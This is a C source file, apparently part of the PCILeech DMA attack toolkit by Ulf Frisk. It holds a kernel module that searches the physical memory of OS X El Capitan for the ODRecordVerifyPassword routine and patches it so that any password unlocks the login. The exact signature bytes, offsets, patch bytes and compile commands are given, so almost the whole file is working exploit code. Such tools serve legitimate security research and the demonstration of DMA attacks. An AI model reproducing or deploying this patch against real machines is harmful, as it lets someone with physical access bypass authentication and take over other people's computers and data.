// ax64_unlock.c : kernel code to remove the password requirement when logging on to OS X.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_unlock.c
// ml64.exe ax64_common_a.asm /Feax64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main ax64_unlock.obj ax64_common.obj
// shellcode64.exe -o ax64_unlock.exe "APPLE OS X UNLOCKER - REMOVE PASSWORD REQUIREMENT!               \n=================================================================\nREQUIRED OPTIONS:                                                \n  -0   : Set to one (1) in order to unlock.                      \n         Example: '-0 1'.                                        \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) ===================%s\nSTATUS        : 0x%08X  \n=================================================================\n"
//
#include "ax64_common.h"

//----------------------------------------------------------------------------------------------------------

typedef struct tdSignatureChunk {
	WORD cbOffset;
	BYTE cb;
	BYTE pb[8];
} SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;

typedef struct tdSignature {
	// in unlock mode: 
	//   chunk[0] = signature chunk 1 (required) 
	//   chunk[1] = signature chunk 2 (optional)
	//   chunk[2] = patch chunk (required)
	SIGNATURE_CHUNK chunk[3];
} SIGNATURE, *PSIGNATURE;

//----------------------------------------------------------------------------------------------------------

BOOL Unlock_FindAndPatch(PKMDDATA pk, PBYTE pbPages, DWORD cPages, PSIGNATURE pSignatures, DWORD cSignatures)
{
	BOOL result = FALSE;
	PBYTE pb;
	DWORD pgIdx, i;
	PSIGNATURE ps;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			if(!ps->chunk[0].cb || SysVCall(pk->fn.memcmp, pb + ps->chunk[0].cbOffset, ps->chunk[0].pb, (QWORD)ps->chunk[0].cb)) {
				continue;
			}
			if(ps->chunk[1].cb && SysVCall(pk->fn.memcmp, pb + ps->chunk[1].cbOffset, ps->chunk[1].pb, (QWORD)ps->chunk[1].cb)) {
				continue;
			}
			SysVCall(pk->fn.memcpy, pb + ps->chunk[2].cbOffset, ps->chunk[2].pb, (QWORD)ps->chunk[2].cb);
			result = TRUE;
		}
	}
	return result;
}

#define NUMBER_OF_SIGNATURES 1
STATUS Unlock(PKMDDATA pk)
{
	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (El Capitan | 466064 bytes)
			{ .cbOffset = 0xfce,.cb = 6,.pb = { 0xe8, 0x69, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31 } },
			{ .cbOffset = 0xfd3,.cb = 6,.pb = { 0xeb, 0x02, 0x31, 0xdb, 0x88, 0xd8, 0x48, 0x83 } },
			{ .cbOffset = 0xfd7,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
	};
	PBYTE pbMemoryMap;
	QWORD cbMemoryMap, qwBaseAddress, qwMemoryAddressMax;
	BOOL result = FALSE;
	// 1: Retrieve physical memory map
	pbMemoryMap = (PBYTE)SysVCall(pk->fn.IOMalloc, 4096);
	if(!pbMemoryMap) {
		return STATUS_FAIL_BASE | 2;
	}
	if(!GetMemoryMap(pk, pbMemoryMap, &cbMemoryMap)) {
		return STATUS_FAIL_BASE | 3;
	}
	qwMemoryAddressMax = GetMemoryPhysicalMaxAddress(pbMemoryMap, cbMemoryMap);
	// 2: Search for the memory signature and patch it.
	for(qwBaseAddress = 0; qwBaseAddress < qwMemoryAddressMax; qwBaseAddress += 0x100000) {
		if(IsRangeInPhysicalMap(pbMemoryMap, cbMemoryMap, qwBaseAddress, 0x100000)) {
			MapMemoryPhysical(pk, qwBaseAddress);
			result = Unlock_FindAndPatch(pk, (PBYTE)VM_MIN_PHYSICALMAPPING_ADDRESS, 0x100, oSigs, NUMBER_OF_SIGNATURES) || result;
		}
	}
	SysVCall(pk->fn.IOFree, pbMemoryMap, 4096);
	return result ? STATUS_SUCCESS : STATUS_FAIL_BASE | 4;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	if(pk->dataIn[0] == 1) {
		pk->dataOut[0] = Unlock(pk);
	} else {
		pk->dataOut[0] = STATUS_FAIL_BASE | 1;
	}
}